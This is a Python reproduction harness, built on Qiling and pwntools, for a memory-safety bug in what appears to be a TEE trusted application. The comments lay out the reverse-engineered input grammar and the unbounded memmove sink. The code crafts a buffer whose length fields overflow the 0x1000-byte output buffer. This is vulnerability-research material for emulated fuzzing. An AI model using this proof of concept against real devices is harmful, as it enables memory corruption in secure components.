#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === MIRISKM-3 (S16 F7) structure-aware reproduction harness ===========
# Target: lapis miriskm 8aaaf201-2460-0000-7143fe4f7c823c80, cmd 0x9102 =
#   generate_status_cert @0x2c870(lapis) -> collect_all_devstatus.
#
# REAL gate (re-derived from the LAPIS binary @0x231b0 / @0x23390):
#   paramTypes == 0x65 ; params[0].size == 0x1000 (INPUT) ;
#                        params[1].size == 0x1000 (OUTPUT).
#   Handler call: x0 = IN_buf + 0x10  (parsed content base)
#                 w1 = *(u32*)(IN_buf + 8)   <-- "in_len" a2, ATTACKER-CONTROLLED
#                 x2 = OUT_buf + 0x10        (output base)
#   => the input buffer has a 0x10-byte header; byte[8] is a u32 in_len the
#      parser uses as the authoritative content length (NOT the GP param size).
#
# REAL input grammar of collect_all_devstatus(a1=IN+0x10, a2=in_len) — fields are
#   length-prefixed, offsets measured from a1, all bounded by a2:
#     [u32 fwk_prop_len F][F bytes "{...}"]      ; F>2 ; body[0]=='{' body[-1]=='}'
#     [u32 daemon_prop_len=27][27B daemon TLV]   ; MUST == 27 (3 props x 9B)
#     [u32 challenge_len C][C bytes]             ; C<=0xFF ; if C<=0xF must==4 & =="0000"
#     [u32 flags_len G][G bytes]                 ; G!=0 ; AND F+47+G == a2 exactly
#   Bounds: F+4<=a2-12 ; (F+8)+27<=a2-8 ; (F+39)+4<=a2-4 ; F+47+G == a2.
#
# OOB-WRITE SINK: convertAllStatus copies the fwk_prop body (F-2 bytes) into the
#   OUTPUT (param1) via memmove(sub_32E48) with NO output bound, prefixed by
#   `"data":{` and followed by per-flag KVs + `"hash":<64hex>` +
#   `"cert_chain":<400hex>` + `}` (~480-byte fixed skeleton). The OUTPUT buffer is
#   only 0x1000 and redzoned. With F maxed, OUTPUT receives ~8 + (F-2) + ~480
#   bytes => overflow past 0x1000 => asan CRASH_PC == S16-F7 REPRODUCED.
#
# We pick in_len a2 = 0xFF0 (so content [0x10,0x10+0xFF0) fits the 0x1000 INPUT)
#   and F near max (a2-48) so data+skeleton > 0x1000.

CMD = 0x9102
PTYPES = 0x65
INSZ = 0x1000
OUTSZ = 0x1000
A2 = 0xFF0                  # in_len placed at IN_buf[8]; content fits [0x10, 0x10+0xFF0) == [0x10,0x1000)

def _daemon27():
    props = b""
    for typ in (0x00, 0x02, 0x03):          # lock, selinux, root (each [u32=5][u8 type][u32 value])
        props += struct.pack("<I", 5) + bytes([typ]) + struct.pack("<I", 1)
    assert len(props) == 27, len(props)
    return props

def _build(F, flag_mask=0x00):
    # content (from offset 0x10) must total exactly A2:  47 + F + G == A2 => G = A2-47-F
    G = A2 - 47 - F
    assert G >= 1, (F, G)
    fwk = b"{" + b"A" * (F - 2) + b"}"        # F bytes, valid {...}
    content = (struct.pack("<I", F) + fwk
               + struct.pack("<I", 27) + _daemon27()
               + struct.pack("<I", 4) + b"0000"
               + struct.pack("<I", G) + bytes([flag_mask]) + b"\x00" * (G - 1))
    assert len(content) == A2, (len(content), A2)
    # 0x10-byte input header: in_len at [8]; rest zero.
    header = b"\x00" * 8 + struct.pack("<I", A2) + b"\x00" * 4
    buf = header + content
    assert len(buf) == 0x10 + A2 == INSZ, (len(buf), INSZ)
    return buf

FORCE_F = os.environ.get("F7_F")

def place_input_callback(ql: Qiling, input: bytes, _: int):
    if len(input) < 2:
        return False
    if FORCE_F is not None:
        F = int(FORCE_F, 0)
    else:
        lo, hi = 2048, A2 - 48          # overflow window; hi keeps G>=1
        F = lo + (struct.unpack_from("<H", input, 0)[0] % (hi - lo + 1))
    flag_mask = input[2] if len(input) > 2 else 0x00
    try:
        buf = _build(F, flag_mask)
    except AssertionError:
        return False
    print(f"[F7] cmd=0x9102 in_len(a2)={A2:#x} fwk_prop_len(F)={F:#x} flag_mask={flag_mask:#x} "
          f"(OUT write ~= 8+{F-2}+~480 into {OUTSZ:#x})")
    command_params = [
        MemRefParam(buf, INSZ),            # param0 INPUT
        MemRefParam(bytes(OUTSZ), OUTSZ),  # param1 OUTPUT (redzoned)
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, command_params)
    return True
